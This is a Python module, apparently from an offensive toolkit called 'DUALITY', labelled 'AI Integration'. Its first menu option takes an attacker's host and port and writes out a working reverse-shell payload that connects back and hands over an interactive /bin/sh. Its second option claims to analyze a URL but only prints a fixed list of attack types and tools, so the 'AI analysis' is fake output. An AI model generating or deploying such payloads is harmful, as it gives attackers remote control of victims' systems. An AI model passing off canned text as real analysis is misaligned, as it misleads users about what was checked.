#!/usr/bin/env python3
# AI Integration Module

import time
from core.colors import Colors
from config.settings import PAYLOAD_DIR

class AIIntegration:
    def __init__(self):
        self.name = "AI Integration"
    
    def run(self):
        print(f"\n{Colors.CYAN}[*] {self.name}{Colors.END}")
        print(f"{Colors.GREEN}[1] Generate Payload")
        print(f"{Colors.GREEN}[2] Analyze Vulnerability")
        
        choice = input(f"\n{Colors.RED}DUALITY{Colors.WHITE}➤ {Colors.END}")
        
        if choice == '1':
            lhost = input(f"{Colors.GREEN}LHOST > {Colors.END}")
            lport = input(f"{Colors.GREEN}LPORT > {Colors.END}")
            payload = f'''import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])'''
            filename = f"{PAYLOAD_DIR}/ai_payload_{int(time.time())}.py"
            with open(filename, 'w') as f:
                f.write(payload)
            print(f"{Colors.GREEN}[+] AI Payload: {filename}{Colors.END}")
        elif choice == '2':
            url = input(f"{Colors.GREEN}URL > {Colors.END}")
            print(f"{Colors.CYAN}[*] Analyzing {url}...{Colors.END}")
            print(f"""
{Colors.GREEN}[+] Analysis Result:{Colors.END}
    Check: SQL Injection, XSS, LFI, Admin Panel
    Use: sqlmap, dalfox, gobuster
            """)
